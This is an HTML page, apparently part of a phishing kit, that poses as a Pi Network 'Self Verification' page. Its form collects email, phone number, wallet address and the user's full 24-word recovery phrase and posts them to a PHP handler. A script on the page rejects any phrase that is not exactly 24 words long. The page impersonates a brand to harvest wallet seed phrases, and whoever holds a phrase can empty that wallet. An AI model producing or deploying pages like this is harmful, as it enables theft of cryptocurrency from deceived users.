<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Self Verification - Pi Network</title>
    <link rel="stylesheet" href="verify_styles.css">
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="./logo.png" alt="Pi Logo" class="logo">
            <h1>Self Verification</h1>
        </div>
        <nav>
            <ul>
                <li><a href="index.php">Home</a></li>
                <li><a href="about.php">About Pi</a></li>
            </ul>
        </nav>
    </header>

    <section id="verify-section" class="verify-section">
        <h2>Steps for Self Verification</h2>
        <div class="steps-container">
            <div class="step">
                <div class="step-icon">1</div>
                <h3>Step 1: Fill the Form</h3>
                <p>Enter your details such as email, phone number, wallet address, and 24-word recovery phrase.</p>
            </div>
            <div class="step">
                <div class="step-icon">2</div>
                <h3>Step 2: Review and Submit</h3>
                <p>Ensure the data is correct and submit the form for verification.</p>
            </div>
            <div class="step">
                <div class="step-icon">3</div>
                <h3>Step 3: Await Confirmation</h3>
                <p>Your details will be reviewed, and you will be notified once the verification is complete.</p>
            </div>
        </div>

        <form action="submit_verification.php" method="POST" onsubmit="return validateVerification()">
            <div class="input-group">
                <label for="email">Email <span class="required">*</span></label>
                <input type="email" name="email" id="email" placeholder="Enter your email" required>
            </div>
            <div class="input-group">
                <label for="phone">Phone Number (Optional)</label>
                <input type="text" name="phone" id="phone" placeholder="Enter your phone number">
            </div>
            <div class="input-group">
                <label for="wallet_address">Wallet Address <span class="required">*</span></label>
                <input type="text" name="wallet_address" id="wallet_address" placeholder="Enter your wallet address" required>
            </div>
            <div class="input-group">
                <label for="phrase">Enter your 24-word recovery phrase <span class="required">*</span></label>
                <textarea name="phrase" id="phrase" placeholder="Enter your 24-word recovery phrase" required></textarea>
                <small id="error-message" class="error-message"></small>
            </div>
            <button type="submit">Submit</button>
        </form>
    </section>

    <footer>
        <p>&copy; 2024 Pi Network. All rights reserved.</p>
    </footer>

    <script>
        function validateVerification() {
            const phrase = document.getElementById('phrase').value.trim();
            const words = phrase.split(/\s+/);
            const errorMessage = document.getElementById('error-message');

            if (words.length !== 24) {
                errorMessage.textContent = 'Please enter exactly 24 words.';
                return false;
            }

            errorMessage.textContent = '';
            return true;
        }
    </script>
</body>
</html>
